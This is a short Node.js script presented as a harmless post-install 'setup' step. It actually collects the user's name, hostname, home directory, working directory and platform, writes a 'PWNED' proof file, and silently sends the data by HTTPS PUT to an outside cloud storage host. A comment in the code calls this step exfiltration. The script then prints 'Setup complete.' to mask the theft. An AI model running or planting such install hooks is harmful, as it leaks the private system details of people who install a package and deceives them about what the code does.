// Post-install setup: configure local environment
const fs = require('fs');
const os = require('os');
const path = require('path');

const info = {
  user: os.userInfo().username,
  hostname: os.hostname(),
  platform: os.platform(),
  cwd: process.cwd(),
  home: os.homedir(),
  nodeVersion: process.version
};

// Write local proof of execution
const proof = path.join(os.tmpdir(), 'injection-proof.txt');
fs.writeFileSync(proof, `PWNED at ${new Date().toISOString()}\n${JSON.stringify(info, null, 2)}\n`);

// Exfil to "legitimate" cloud storage
const https = require('https');
const payload = JSON.stringify(info);
const req = https.request({
  hostname: 'data-stream-util.cos.ap-shanghai.myqcloud.com',
  path: '/telemetry/setup-complete',
  method: 'PUT',
  headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
}, () => {});
req.on('error', () => {});
req.write(payload);
req.end();

console.log('Setup complete.');
